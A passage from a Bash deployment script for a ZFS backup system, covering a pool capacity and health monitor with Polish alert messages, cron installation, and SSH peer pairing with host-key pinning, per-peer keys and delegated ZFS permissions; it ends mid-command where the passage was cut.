#   rc != 0        the probe itself failed -- report it, and do not run either
#                  loop, because there is no list to loop over;
#   rc == 0, empty a host running this package with ZERO imported pools is not
#                  "nothing to check", it is a host whose storage is gone;
#   rc == 0, list  proceed.
POOLS=\$(zpool list -H -o name 2>&1)
POOLS_RC=\$?
if [ "\$POOLS_RC" -ne 0 ]; then
    alert "sonda pul na \${HOST} PADLA (rc=\${POOLS_RC})" \\
          "'zpool list -H -o name' zakonczylo sie kodem \${POOLS_RC} na \${HOST}, wiec ani pojemnosc, ani stan pul NIE zostaly sprawdzone w tym przebiegu.
Brak alertu o pulach w tym cyklu nie oznacza, ze pule sa zdrowe -- oznacza, ze nikt ich nie widzial.

\${POOLS}"
    POOLS=""
elif [ -z "\${POOLS//[[:space:]]/}" ]; then
    alert "ZERO pul ZFS na \${HOST}" \\
          "'zpool list -H -o name' nie zwrocilo ani jednej puli na \${HOST}. Na hoscie z zainstalowanym tym pakietem to nie jest cisza do zignorowania -- to znaczy, ze zadna pula nie jest zaimportowana."
    POOLS=""
fi

# THE PROBE SUCCEEDED IS NOT THE SAME QUESTION AS THE OUTPUT LOOKS RIGHT.
#
# No pipe here on purpose: \`zpool list ... | tr -d '%'\` reports tr's status,
# not zpool's, so "42%" printed by a command that then exited non-zero read as
# a clean measurement. The % is stripped by parameter expansion instead, and rc
# is captured from the probe itself before anything else can overwrite it.
for pool in \$POOLS; do
    cap_raw=\$(zpool list -H -o capacity "\$pool" 2>/dev/null)
    cap_rc=\$?
    cap=\${cap_raw%%%}
    if [ "\$cap_rc" -ne 0 ]; then
        alert "sonda pojemnosci puli '\${pool}' na \${HOST} PADLA (rc=\${cap_rc})" \\
              "'zpool list -H -o capacity \${pool}' zakonczylo sie kodem \${cap_rc} na \${HOST}, wiec zapelnienie tej puli NIE zostalo sprawdzone -- niezaleznie od tego, co zdazylo wypisac ('\${cap_raw}')."
        continue
    fi
    case "\$cap" in
        ''|*[!0-9]*)
            # Same disease as the enumeration: an unreadable capacity used to
            # produce a shell error on stderr and no finding at all.
            alert "nie odczytano pojemnosci puli '\${pool}' na \${HOST}" \\
                  "'zpool list -H -o capacity \${pool}' nie zwrocilo liczby na \${HOST}, wiec zapelnienie tej puli NIE zostalo sprawdzone." ;;
        *)
            if [ "\$cap" -ge "\$THRESHOLD" ]; then
                alert "pula '\${pool}' na \${HOST}: \${cap}%" \\
                      "Pula '\${pool}' na \${HOST} jest zapelniona w \${cap}% (prog: \${THRESHOLD}%)."
            fi ;;
    esac
done

# IMPORTANT: compare against 'referenced', not 'used' -- 'used' includes all
# retained snapshots and will read as 100%+ even when the live filesystem
# itself has headroom, because refquota only constrains 'referenced'.
zfs list -Hp -o name,referenced,refquota -t filesystem | while IFS=\$'\t' read -r name referenced refquota; do
    [ "\$refquota" = "0" ] && continue
    pct=\$(( referenced * 100 / refquota ))
    if [ "\$pct" -ge "\$THRESHOLD" ]; then
        alert "dataset '\${name}' na \${HOST}: \${pct}%" \\
              "Dataset '\${name}' na \${HOST} wykorzystuje \${pct}% swojego refquota (prog: \${THRESHOLD}%)."
    fi
done

# POOL HEALTH (v4). Capacity was checked daily; HEALTH was checked nowhere in
# the whole estate, and it showed: pve1's rpool sat DEGRADED for weeks with a
# working backup chain and not one alert, because a degraded pool still
# transfers fine -- right up until the second disk goes. Anything != ONLINE is
# a finding, with the zpool status detail attached so the digest names the
# device instead of making the operator ssh in to ask.
# \$POOLS, not a second enumeration: one probe, one failure report. And an
# unreadable HEALTH is a finding of its own -- the previous shape tested
# \`[ -n "\$health" ]\` and fell silent on an empty answer, so a pool whose state
# could not be read looked exactly like a pool that is ONLINE.
for pool in \$POOLS; do
    health=\$(zpool list -H -o health "\$pool" 2>/dev/null)
    health_rc=\$?
    if [ "\$health_rc" -ne 0 ]; then
        # rc BEFORE content: a probe that printed ONLINE and then failed has
        # not established that the pool is ONLINE. Trusting the string would
        # let the single most reassuring word on the host be produced by a
        # command that did not work.
        alert "sonda stanu puli '\${pool}' na \${HOST} PADLA (rc=\${health_rc})" \\
              "'zpool list -H -o health \${pool}' zakonczylo sie kodem \${health_rc} na \${HOST}, wiec stan tej puli NIE zostal sprawdzony -- niezaleznie od tego, co zdazylo wypisac ('\${health}')."
    elif [ -z "\$health" ]; then
        alert "nie odczytano stanu puli '\${pool}' na \${HOST}" \\
              "'zpool list -H -o health \${pool}' nie zwrocilo nic na \${HOST}, wiec stan tej puli NIE zostal sprawdzony.
Brak alertu o tej puli w tym cyklu nie oznacza ONLINE."
    elif [ "\$health" != "ONLINE" ]; then
        detail=\$(zpool status "\$pool" 2>/dev/null | head -n 20)
        alert "pula '\${pool}' na \${HOST}: \${health}" \
              "Pula '\${pool}' na \${HOST} ma stan \${health} (oczekiwany: ONLINE).

\${detail}"
    fi
done

# STALLED TRANSFERS (v4). The engines keep one live-progress record per running
# transfer (/var/lib/zfs-snapshot-all/progress, built 2026-08-23 exactly so a
# monitor can consume it). A record still marked "running" whose watcher
# stopped refreshing it means the transfer died, hung, or was killed -- and
# nothing else reports that: the job's own alert fires only when the job EXITS
# non-zero, which a hung pipeline never does. 30 minutes without a heartbeat on
# a record that refreshes every 2 seconds is not lag; it is a corpse.
PROG_DIR="\${ZFS_PROGRESS_DIR:-/var/lib/zfs-snapshot-all/progress}"
NOW=\$(date +%s)
if [ -d "\$PROG_DIR" ]; then
    for f in "\$PROG_DIR"/*.json; do
        [ -e "\$f" ] || continue
        grep -q '"state":"running"' "\$f" 2>/dev/null || continue
        upd=\$(sed -n 's/.*"updated_epoch":\([0-9]*\).*/\1/p' "\$f")
        case "\$upd" in ''|*[!0-9]*) continue ;; esac
        age=\$(( NOW - upd ))
        if [ "\$age" -ge 1800 ]; then
            ds=\$(sed -n 's/.*"dataset":"\([^"]*\)".*/\1/p' "\$f")
            lb=\$(sed -n 's/.*"label":"\([^"]*\)".*/\1/p' "\$f")
            alert "transfer '\${ds}' (\${lb:-bez etykiety}) na \${HOST}: bez pulsu od \$(( age / 60 )) min" \
                  "Rekord transferu '\${ds}' wciaz mowi 'running', ale nie odswiezyl sie od \$(( age / 60 )) minut (odswieza co 2 s). Transfer najpewniej wisi albo zostal ubity tak, ze kod wyjscia zadania tego nie zglosi. Sprawdz: zfs-backup.sh progress na \${HOST}."
        fi
    done
fi
EOF
    chmod +x "$CAPACITY_SCRIPT"
    log "created $CAPACITY_SCRIPT (alerts -> $NOTIFY_EMAIL, threshold 90%)"
fi

CAPACITY_LINE="0 8 * * * $CAPACITY_SCRIPT 2>>/root/scripts/cron.log"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if ! crontab -l 2>/dev/null | grep -qF "$CAPACITY_SCRIPT"; then
        warn "capacity-check cron line MISSING -- no early warning before a pool fills up"
    elif ! crontab -l 2>/dev/null | sed -n "/^# BEGIN $CRON_HOST_BLOCK/,/^# END $CRON_HOST_BLOCK/p" | grep -qF "$CAPACITY_SCRIPT"; then
        warn "capacity-check cron line is present but LOOSE, outside the '$CRON_HOST_BLOCK' block -- a plain run adopts it into the block, keeping its current schedule"
    else
        log "capacity-check cron line already in the '$CRON_HOST_BLOCK' block"
    fi
else
    # adopt, not ensure: an operator who moved this to 06:00 keeps 06:00. Only
    # the line's LOCATION is this run's business.
    if cron_block_adopt_line root "$CRON_HOST_BLOCK" "$CAPACITY_SCRIPT" "$CAPACITY_LINE" "$CRON_HOST_TAIL"; then
        if [ "${CRON_CHANGED:-0}" -eq 0 ]; then
            log "capacity-check cron line already in the '$CRON_HOST_BLOCK' block, leaving it alone"
        elif [ "${CRON_ADOPTED:-0}" -gt 0 ]; then
            log "moved the capacity-check cron line into the '$CRON_HOST_BLOCK' block (schedule unchanged)"
        else
            log "added capacity-check cron line: $CAPACITY_LINE"
        fi
    else
        warn "could not install the capacity-check cron line: $CRON_ERR"
    fi
fi

echo
log "===================================================================="
log "Dependency summary"
log "===================================================================="
if [ -n "$MISSING_OPTIONAL" ]; then
    warn "still missing:$MISSING_OPTIONAL"
    case "$MISSING_OPTIONAL" in
        *zstd*) warn "  zstd is the DEFAULT compressor -- every cron line using -z will FAIL on this host until it is installed, or you must pass -g to force pigz instead" ;;
    esac
    case "$MISSING_OPTIONAL" in
        *mail*) warn "  without 'mail' this host can run backups but cannot TELL YOU when one breaks -- fix before relying on it unattended" ;;
    esac
    case "$MISSING_OPTIONAL" in
        *ssh*)  warn "  without ssh only local (same-host) jobs will work" ;;
    esac
else
    log "all dependencies present"
fi

# ------------------------------------------------------------------------------
# Peer pairing (--pair / --join) -- see PAIRING-DESIGN.md for the full design.
# Two hosts with NO prior trust (not necessarily a Proxmox cluster). Runs after
# the dependency/repo/alerting/capacity phases above, but is otherwise a
# separate one-shot operation: it deliberately does NOT touch Phase 8's
# BACKUP_USER account below (a different, unrelated delegation) and never
# adds cron lines -- that stays manual, same as everything else in Part 5.
# ------------------------------------------------------------------------------
# PEER_STATE_DIR/PEER_KEY_DIR and the path helpers built from them moved to
# just above do_join_check -- do_commit_scope_check needs peer_manifest_path
# and peer_scope_path, and its dispatch runs before the root check, which is
# well before this section is reached in a normal top-to-bottom read of the
# script's own execution order.

# True for addresses that can only be on a private network: RFC1918, loopback,
# link-local, CGNAT, and their IPv6 equivalents (ULA fc00::/7, fe80::/10, ::1).
is_private_addr() {
    case "$1" in
        10.*|127.*|192.168.*|169.254.*) return 0 ;;
        172.1[6-9].*|172.2[0-9].*|172.3[01].*) return 0 ;;
        100.6[4-9].*|100.[7-9][0-9].*|100.1[01][0-9].*|100.12[0-7].*) return 0 ;;
        ::1|fc*:*|fd*:*|fe8*:*|fe9*:*|fea*:*|feb*:*) return 0 ;;
    esac
    return 1
}

# --peer is fed straight to ssh-keyscan, whose whole job is to trust whatever
# answers. If the name is wrong the pairing does not fail -- it succeeds against
# somebody else, pinning a stranger's host key and then sending the pairing key
# out to them on the next --draft-config.
#
# This is not hypothetical. On metropolis, `pve2` from pve1 has no /etc/hosts
# entry, so the resolver appends the search domain and `getent hosts pve2`
# answers with FOUR public addresses belonging to the real, unrelated
# metropolis.net. Nothing in the flow noticed: the fingerprint was printed with
# a "CONFIRM this" line and the script carried on.
#
# Two fingerprints of that failure, both refused:
#   - more than one distinct address for one peer -- a real peer has one, a
#     search-domain accident routinely has several
#   - a public address, which no LAN pairing should ever produce
# A literal IP is exempt: no resolution happened, so there is nothing to have
# gone wrong, and a WAN pairing (which PAIRING-DESIGN.md allows) can always be
# addressed that way -- or with --allow-public-peer, deliberately.
assert_peer_address_sane() {
    case "$PEER_HOST" in
        *[!0-9.]*) ;;                     # not a bare IPv4 literal, keep checking
        *) log "peer address $PEER_HOST is a literal IP -- no name resolution involved"; return 0 ;;
    esac
    case "$PEER_HOST" in
        *:*) log "peer address $PEER_HOST is a literal IPv6 -- no name resolution involved"; return 0 ;;
    esac

    local addrs
    addrs=$(getent ahosts "$PEER_HOST" 2>/dev/null | awk '{print $1}' | sort -u)
    [ -n "$addrs" ] || die "--peer='$PEER_HOST' does not resolve on this host -- add it to /etc/hosts or pass the IP address directly"

    local count; count=$(printf '%s\n' "$addrs" | wc -l)
    if [ "$count" -gt 1 ]; then
        die "--peer='$PEER_HOST' resolves to $count different addresses ($(printf '%s' "$addrs" | tr '\n' ' ')) -- a peer has one. This is the signature of a search domain answering for a name that has no local entry, and ssh-keyscan would happily pin whichever of them replies first. Add '$PEER_HOST' to /etc/hosts, or pass the IP address to --peer."
    fi

    log "peer $PEER_HOST resolves to $addrs"
    if ! is_private_addr "$addrs"; then
        [ "$PEER_ALLOW_PUBLIC" -eq 1 ] || die "--peer='$PEER_HOST' resolves to $addrs, which is a PUBLIC address. If that is genuinely your peer over a WAN, re-run with --allow-public-peer (or pass the IP directly); if it is not, you were one command away from pinning a stranger's host key."
        warn "pairing with a PUBLIC address $addrs because --allow-public-peer was given -- verify the fingerprint below with extra care"
    fi
}

# The scanned host key belongs to the RELATIONSHIP, not to whichever account
# happened to run --pair. It is therefore written to a per-peer file holding
# exactly one key -- what the generated job points -k at -- as well as to
# /root/.ssh/known_hosts, which deploy.sh's own ssh calls read (--revoke-old
# connects with StrictHostKeyChecking=yes).
pin_host_key() {
    local scan="$1" file="$2"
    if grep -qF "$scan" "$file" 2>/dev/null; then
        log "host key for $PEER_HOST already pinned in $file"
        return 0
    fi
    printf '%s\n' "$scan" >> "$file" || die "could not write $file"
    log "pinned $PEER_HOST's host key to $file"
}

# Hole the pairing feature had until 2026-07-29: the key lives in
# /root/.ssh/pairing (0700, root), but for --role=pull the job that uses it is a
# snapget.sh cron line, and the whole point of a delegated account is that this
# line does NOT run as root. -K pointed at a file the running account could not
# read, and nothing said so until the job failed.
#
# The pinned host key had the identical hole one layer down, and both are
# installed HERE, by one function, on purpose: they are the two halves of "this
# job authenticates the peer and the peer authenticates this job", they are
# wanted at exactly the same moments, and keeping them in separate functions is
# how one of them silently stops being refreshed on rotation.
#
# The copy is deliberate rather than a chmod: /root/.ssh/pairing stays 0700 and
# root-owned, and only the ONE key for this relationship crosses over.
install_local_pairing_files() {
    local src_key="$1" src_kh="$2" label="$3" user="$4"
    local home_dir; home_dir=$(getent passwd "$user" | cut -d: -f6)
    [ -n "$home_dir" ] || die "cannot determine home directory for --local-user='$user'"
    local group; group=$(id -gn "$user")
    mkdir -p "$home_dir/.ssh"
    chown "$user:$group" "$home_dir/.ssh"
    chmod 700 "$home_dir/.ssh"

    local dest="$home_dir/.ssh/pairing-${label}_ed25519"
    install -o "$user" -g "$group" -m 600 "$src_key" "$dest" \
        || die "could not install a readable copy of the pairing key at $dest"
    log "installed a copy of the pairing key for $user: $dest"

    # Missing only for a pairing made before host-key pinning existed. Not
    # fatal: the key half is what makes the job work at all, and --draft-config
    # notices the absent file and declines to emit a -k pointing at nothing.
    if [ -f "$src_kh" ]; then
        local dest_kh="$home_dir/.ssh/pairing-${label}_known_hosts"
        install -o "$user" -g "$group" -m 600 "$src_kh" "$dest_kh" \
            || die "could not install a readable copy of the pinned host key at $dest_kh"
        log "installed the pinned host key for $user: $dest_kh"
    else
        warn "no pinned host-key file at $src_kh -- $user gets no -k, jobs will fall back to accept-new. Re-run --pair to create it."
    fi
    # Deliberately prints nothing but the log lines: an earlier version also
    # echoed $dest as a return value, which forced callers to redirect stdout
    # and silently swallowed the log with it. Callers that need a path ask
    # local_keyfile_path / local_knownhosts_path instead.
}

# Where the GENERATED job should look for the key: the local-user copy when
# there is one, otherwise root's original.
local_keyfile_path() {
    local label="$1" user="$2"
    if [ -n "$user" ]; then
        local home_dir; home_dir=$(getent passwd "$user" | cut -d: -f6)
        [ -n "$home_dir" ] && { printf '%s' "$home_dir/.ssh/pairing-${label}_ed25519"; return 0; }
    fi
    printf '%s' "$PEER_KEY_DIR/${label}_ed25519"
}

# Same question for the pinned host key. Root's job gets the per-peer file too,
# not /root/.ssh/known_hosts: that file accumulates whatever accept-new has
# recorded over the years, and pinning "one key, verified once at pair time" is
# the whole point of the -k the draft emits.
local_knownhosts_path() {
    local label="$1" user="$2"
    if [ -n "$user" ]; then
        local home_dir; home_dir=$(getent passwd "$user" | cut -d: -f6)
        [ -n "$home_dir" ] && { printf '%s' "$home_dir/.ssh/pairing-${label}_known_hosts"; return 0; }
    fi
    printf '%s' "$PEER_KEY_DIR/${label}_known_hosts"
}

# do_pair -- runs on the host that will connect (collector for pull, source
# for push). Generates/reuses a key dedicated to THIS relationship, pins the
# peer's host key, and produces the wsad for manual transfer.
do_pair() {
    local label; label=$(peer_label)
    local mpath; mpath=$(peer_manifest_path "$label")
    mkdir -p "$PEER_STATE_DIR" "$PEER_KEY_DIR"
    chmod 700 "$PEER_KEY_DIR"

    if [ "$PEER_UNPAIR" -eq 1 ]; then
        do_unpair "$label" "$mpath"
        return
    fi
    if [ "$PEER_REVOKE_OLD" -eq 1 ]; then
        do_revoke_old "$label" "$mpath"
        return
    fi
    if [ "$PEER_DRAFT_CONFIG" -eq 1 ]; then
        do_draft_config "$label" "$mpath"
        return
    fi

    if [ "$PEER_ROTATE" -eq 1 ]; then
        [ -r "$mpath" ] || die "--rotate needs an existing pairing for '$PEER_HOST' -- run --pair once first (without --rotate)"
        # shellcheck disable=SC1090
        . "$mpath"
        [ "${PEER_ROTATING:-no}" = "yes" ] && die "peer '$PEER_HOST' already has a rotation in progress -- finish it with --revoke-old first, or remove ${PEER_KEY_DIR}/${label}_ed25519.new by hand to restart"
        PEER_ROLE="${PEER_SAVED_ROLE:-$PEER_ROLE}"
        PEER_TARGET="${PEER_SAVED_TARGET:-$PEER_TARGET}"
        PEER_AS="${PEER_SAVED_AS:-$PEER_AS}"
        PEER_MODE="${PEER_SAVED_MODE:-$PEER_MODE}"
        [ -n "$PEER_DATASETS" ] || PEER_DATASETS="${PEER_SAVED_DATASETS:-}"
        [ -n "$PEER_REQUESTED" ] || PEER_REQUESTED="${PEER_SAVED_REQUESTED:-}"
        [ -n "$PEER_LOCAL_USER" ] || PEER_LOCAL_USER="${PEER_SAVED_LOCAL_USER:-}"
        [ "$PEER_PORT_GIVEN" -eq 1 ] || PEER_PORT="${PEER_SAVED_PORT:-$PEER_PORT}"
    else
        if [ -r "$mpath" ]; then
            # Re-pairing an existing relationship. Role/target/account-mode/
            # peer-mode are identity-defining for this relationship and must
            # NOT silently drift back to CLI defaults just because this
            # invocation didn't repeat them -- --role/--as default to
            # "pull"/"delegated" whether or not the admin typed them, so
            # there is no way to tell "typed the default" from "didn't type
            # it at all". The saved manifest always wins for these four; only
            # the dataset list is allowed to change here (additively, below).
            local requested_datasets="$PEER_DATASETS" requested_named="$PEER_REQUESTED"
            # shellcheck disable=SC1090
            . "$mpath"
            PEER_ROLE="${PEER_SAVED_ROLE:-$PEER_ROLE}"
            PEER_TARGET="${PEER_SAVED_TARGET:-$PEER_TARGET}"
            PEER_AS="${PEER_SAVED_AS:-$PEER_AS}"
            PEER_MODE="${PEER_SAVED_MODE:-$PEER_MODE}"
            [ -n "$requested_datasets" ] && PEER_DATASETS="$requested_datasets" || PEER_DATASETS="${PEER_SAVED_DATASETS:-}"
            # Same rule as the dataset list one line up: a value given on THIS
            # command line wins, otherwise the manifest's survives. A re-run of
            # the same one-command enrolment (the documented way to resume it)
            # therefore keeps naming what it named the first time.
            [ -n "$requested_named" ] && PEER_REQUESTED="$requested_named" || PEER_REQUESTED="${PEER_SAVED_REQUESTED:-}"
            # --local-user and --port are operational, not identity-defining
            # (which account runs cron here, and which port sshd listens on,
            # can legitimately change), so a given value wins.
            [ -n "$PEER_LOCAL_USER" ] || PEER_LOCAL_USER="${PEER_SAVED_LOCAL_USER:-}"
            [ "$PEER_PORT_GIVEN" -eq 1 ] || PEER_PORT="${PEER_SAVED_PORT:-$PEER_PORT}"
            log "peer '$PEER_HOST' already paired -- reusing the existing key/role/target/account-mode, refreshing the wsad"
            if [ -n "$requested_datasets" ] && [ "${PEER_SAVED_DATASETS:-}" != "$requested_datasets" ]; then
                log "dataset list changed: '${PEER_SAVED_DATASETS:-}' -> '$requested_datasets'"
                log "(additive only on the --join side -- nothing already granted is ever revoked automatically)"
            fi
        else
            if [ -n "$PEER_MODE" ]; then
                # F1: the whole point is that the collector operator does not
                # have to name the source's datasets. --target is likewise not
                # required here for mode=backup -- "inherits the server
                # default target" (F1) is the wrapper's job (zfs-backup.sh's
                # own DEFAULT_TARGET), resolved before it ever calls
                # deploy.sh; --mode=sync already refused a --target above.
                :
            else
                [ -n "$PEER_DATASETS" ] || die "--pair requires --peer-datasets=\"...\" (or --mode=backup|sync for a high-level relationship that defers dataset selection to the peer)"
                [ -n "$PEER_TARGET" ] || die "--pair requires --target=DATASET"
            fi
        fi
    fi

    local keyfile="$PEER_KEY_DIR/${label}_ed25519"
    local active_keyfile="$keyfile"

    # ---- host key pinning: ssh-keyscan needs no prior trust, so this adds
    # zero manual steps compared to today's accept-new (see PAIRING-DESIGN.md,
    # decision B). It trusts whatever answers, so WHO answers is settled first. --
    assert_peer_address_sane
    log "fetching host key for $PEER_HOST:$PEER_PORT via ssh-keyscan..."
    local scan; scan=$(ssh-keyscan -p "$PEER_PORT" -t ed25519 "$PEER_HOST" 2>/dev/null)
    [ -n "$scan" ] || die "ssh-keyscan got nothing back from $PEER_HOST:$PEER_PORT -- host unreachable, wrong port, or sshd not up yet"
    local fp; fp=$(printf '%s\n' "$scan" | ssh-keygen -lf - 2>/dev/null | head -1)
    log "host key fingerprint for $PEER_HOST: $fp"
    log "CONFIRM this matches what you see connecting to $PEER_HOST directly before relying on it."
    mkdir -p /root/.ssh; chmod 700 /root/.ssh
    pin_host_key "$scan" /root/.ssh/known_hosts
    local peer_kh="$PEER_KEY_DIR/${label}_known_hosts"
    pin_host_key "$scan" "$peer_kh"

    # ---- dedicated per-peer keypair ----
    if [ "$PEER_ROTATE" -eq 1 ]; then
        active_keyfile="${keyfile}.new"
        [ -f "$active_keyfile" ] && die "a rotation is already in progress ($active_keyfile exists)"
        ssh-keygen -t ed25519 -N '' -f "$active_keyfile" -C "pairing-${label}-rotated-$(date +%Y%m%d)" \
            || die "ssh-keygen failed"
        log "generated a NEW key for rotation: $active_keyfile (old key untouched, both work until --revoke-old)"
    elif [ -f "$keyfile" ]; then
        log "keypair for '$PEER_HOST' already exists ($keyfile), reusing it -- pass --rotate to replace it instead"
    else
        ssh-keygen -t ed25519 -N '' -f "$keyfile" -C "pairing-${label}-$(date +%Y%m%d)" \
            || die "ssh-keygen failed"
        log "generated keypair for '$PEER_HOST': $keyfile"
    fi

    # ---- make the key usable by the account that will actually run the jobs.
    # NOT during --rotate: mid-rotation the new key is unproven, and the running
    # cron must keep using the old one until --revoke-old promotes it (which
    # refreshes this copy). That is what makes rotation zero-downtime for a
    # delegated account too, not just for root. ----
    if [ -n "$PEER_LOCAL_USER" ] && [ "$PEER_ROTATE" -eq 0 ]; then
        install_local_pairing_files "$keyfile" "$peer_kh" "$label" "$PEER_LOCAL_USER"
    fi

    # ---- target dataset: created HERE only for pull (local to this host).
    # For push the target is remote -- there is no trust to the peer yet at
    # --pair time, so that creation happens during --join instead.
    # Per the naming convention (<target>/<host-zrodla>/<dataset>), the actual
    # per-relationship root is target/label, not the bare target -- otherwise
    # a second peer pairing to the same --target parent would land in the same
    # spot. ----
    # REV-20260804-042 Gate I, found live: --mode=sync deliberately refuses
    # --target (F3/U7 -- sync reproduces the source's own paths 1:1, there is
    # no separate target root to namespace under), so PEER_TARGET is empty
    # for a sync-mode pull relationship. The block below assumed a pull
    # relationship always has a non-empty target and built "$PEER_TARGET/$label"
    # unconditionally -- for sync that collapses to "/$label", a bare
    # leading-slash path `zfs create -p` correctly refuses. Sync mode has
    # never actually paired live before this gate ran. Whatever path a sync
    # relationship eventually receives into is created on demand at receive
    # time (snapget.sh/zfs receive -p), the same way a brand-new multi-level
    # backup-mode target already is -- there is nothing meaningful to
    # pre-create or delegate here for it.
    if [ "$PEER_ROLE" = "pull" ] && [ "$PEER_ROTATE" -eq 0 ] && [ -n "$PEER_TARGET" ]; then
        local dest_root="$PEER_TARGET/$label"
        if zfs list -H -o name "$dest_root" >/dev/null 2>&1; then
            log "target dataset $dest_root already exists"
        else
            zfs create -p "$dest_root" && log "created target dataset $dest_root" \
                || die "zfs create -p $dest_root failed"
        fi
        # The mirror image of what --join does on the peer, and it was simply
        # missing: --join delegates the SOURCE side over there, but nothing
        # delegated the RECEIVE side over here. As root that is invisible -- the
        # pairing looks finished and the first delegated snapget.sh run dies on
        # 'cannot receive: permission denied'. zfs allow is inherited by
        # descendants, so one grant on the per-peer root covers every dataset
        # received under it, whatever the peer decides to send.
        if [ -n "$PEER_LOCAL_USER" ]; then
            zfs allow -u "$PEER_LOCAL_USER" "$ZFS_PERMS" "$dest_root" \
                || die "zfs allow failed for $dest_root"
            log "delegated ($ZFS_PERMS) on $dest_root to $PEER_LOCAL_USER"
        else
            log "no --local-user given -- $dest_root is delegated to nobody, the generated jobs will have to run as root"
        fi
    fi

    local my_label; my_label=$(hostname -s 2>/dev/null || hostname)
    local proposed_account="zfsbackup-${my_label}"
    [ "$PEER_AS" = "root" ] && proposed_account="root"

    local pub; pub=$(cat "${active_keyfile}.pub")
    local rotating="no" prev_pub=""
    if [ "$PEER_ROTATE" -eq 1 ]; then
        rotating="yes"
        prev_pub=$(cat "${keyfile}.pub" 2>/dev/null || echo "")
    fi
    cat > "$mpath" <<EOF
# peer pairing manifest (initiator side) -- managed by deploy.sh --pair, do not edit by hand
PEER_SAVED_ROLE=$PEER_ROLE
PEER_SAVED_DATASETS="$PEER_DATASETS"
PEER_SAVED_REQUESTED="$PEER_REQUESTED"
PEER_SAVED_TARGET=$PEER_TARGET
PEER_SAVED_AS=$PEER_AS
PEER_SAVED_MODE=$PEER_MODE
PEER_SAVED_ACCOUNT=$proposed_account
PEER_SAVED_PORT=$PEER_PORT
PEER_SAVED_LOCAL_USER=$PEER_LOCAL_USER
PEER_ROTATING=$rotating
PEER_CURRENT_PUBKEY='$pub'
PEER_PREVIOUS_PUBKEY='$prev_pub'
EOF
    chmod 0600 "$mpath"

    local workdir; workdir=$(mktemp -d)
    cp "${active_keyfile}.pub" "$workdir/pubkey.pub"
    cat > "$workdir/peer.conf" <<EOF
# wsad parowania -- wygenerowane przez deploy.sh --pair, konsumowane przez --join
PEER_CONF_ROLE=$PEER_ROLE
PEER_CONF_DATASETS="$PEER_DATASETS"
PEER_CONF_TARGET=$PEER_TARGET
PEER_CONF_AS=$PEER_AS
PEER_CONF_MODE=$PEER_MODE
PEER_CONF_ACCOUNT=$proposed_account
PEER_CONF_PORT=$PEER_PORT
PEER_CONF_INITIATOR_LABEL=$my_label
EOF
    # Only ever written when there IS a request to carry. An absent key reads
    # exactly like every package produced before this change, so an older
    # collector's wsad still joins and still gets the whole-estate draft it
    # always got -- the narrowing is opt-in by presence, never a new required
    # field that would refuse a package from a host that has not updated yet.
    [ -n "$PEER_REQUESTED" ] && echo "PEER_CONF_REQUESTED=\"$PEER_REQUESTED\"" >> "$workdir/peer.conf"
    # REV-20260802-033 slice 9 / U10 condition 3: the peer's OWN manifest
    # records that this entry was created remotely -- do_join reads this flag
    # from the validated package and writes it, plus who/when on ITS side,
    # into its own manifest. Not written unless the flag was actually given.
    [ "$PEER_JOIN_REMOTELY" -eq 1 ] && echo "PEER_CONF_REMOTE_JOIN=yes" >> "$workdir/peer.conf"
    local outdir="/root/scripts/pairing"
    mkdir -p "$outdir"
    local suffix=""; [ "$PEER_ROTATE" -eq 1 ] && suffix="-rotate"
    local pkg="$outdir/${my_label}-to-${label}${suffix}.tgz"
    tar -C "$workdir" -czf "$pkg" peer.conf pubkey.pub
    rm -rf "$workdir"

    # REV-20260802-033 slice 9 / U10: opt-in remote --join + scope editor.
    # Three conditions from the discussion, all held to exactly:
    #   1. Finalize (--commit-scope, the GRANT) stays local, always -- this
    #      block never runs it, over ssh -t or otherwise. Only --join (which
    #      grants nothing since U2) and the SCOPE EDITOR (an interactive
    #      session, not an automated commit) are automated.
    #   2. Rides the pin ssh-keyscan just established above (/root/.ssh/
    #      known_hosts) -- no accept-new, no separate trust decision.
    #   3. The peer's manifest records the remote origin (PEER_CONF_REMOTE_JOIN
    #      above, consumed by do_join below).
    # On any failure this WARNS and falls through to the manual instructions
    # -- "manual transfer remains as the emergency path" (U10) means exactly
    # that a failed automated attempt must not strand the operator.
    # REV-20260804-037 F1: the old remote command joined draft and editor with
    # a bare ';' (editor opened even after a failed draft) and discarded the
    # draft's stderr (2>/dev/null) -- the one diagnostic that explains why. A
    # failed draft plus an editor opened as root on a NONEXISTENT path can
    # itself create an empty/partial scope file, which then blocks a clean
    # re-draft (the generator refuses to overwrite an existing file). Worse,
    # $remote_ok was set right after --join and never revisited, so a failed
    # editor only warned while the final summary still called the scope
    # "edited" -- true state was join_ok, not join_ok-and-scope_ok.
    #
    # Fixed by staging the four substeps explicitly (draft only if the scope
    # is absent; stop before the editor if the draft failed; run the editor;
    # then the NON-GRANTING --commit-scope-check as proof the file the editor
    # produced actually parses) and reporting via distinct exit codes, so the
    # final summary can name the exact stage reached instead of collapsing
    # everything but a scp/ssh transport failure into one bucket.
    local remote_ok=0 scope_rc=-1
    local remote_scope; remote_scope=$(peer_scope_path "$my_label")
    if [ "$PEER_JOIN_REMOTELY" -eq 1 ]; then
        log "--join-remotely: delivering the wsad and running --join on $PEER_HOST over the pin just established..."
        # BOUNDED, and stdin CLOSED. `--join` asks for scope acceptance and
        # deliberately has no --yes; run from here it has no terminal, so the
        # question can never be answered. Measured on metropolis 2026-08-20:
        # the peer sat in `wchan=pipe_read stdin=pipe:` for over six minutes,
        # silent, and would have sat there forever.
        #
        # The sting was that this branch ALREADY handles a failed join -- the
        # else arm below prints the manual steps and the caller carries on.
        # That recovery simply could not be reached, because the call never
        # returned. A design that survives failure is defeated by a call that
        # cannot fail.
        #
        # `ssh -n` is the fix that matters: the remote read gets EOF at once
        # and --join exits with its own "join interrupted before scope
        # acceptance", which is precisely the failure the else arm was written
        # for. Confirmed live before this change by running the same path with
        # stdin closed by hand -- the fallback fired exactly as designed.
        #
        # `timeout` is the second bound, for a stall that is NOT about stdin (a
        # wedged link, a peer paging). Its own absence is safe rather than
        # clever: no `timeout` binary means the command fails, which lands in
        # the same else arm instead of hanging. coreutils is already a hard
        # dependency here (md5sum), so this is not a new one in practice.
        if timeout "$PEER_REMOTE_JOIN_TIMEOUT" \
               scp -o UserKnownHostsFile=/root/.ssh/known_hosts -o StrictHostKeyChecking=yes \
               -P "$PEER_PORT" "$pkg" "root@$PEER_HOST:/root/" \
           && timeout "$PEER_REMOTE_JOIN_TIMEOUT" \
               ssh -n -o UserKnownHostsFile=/root/.ssh/known_hosts -o StrictHostKeyChecking=yes \
                  -p "$PEER_PORT" "root@$PEER_HOST" \
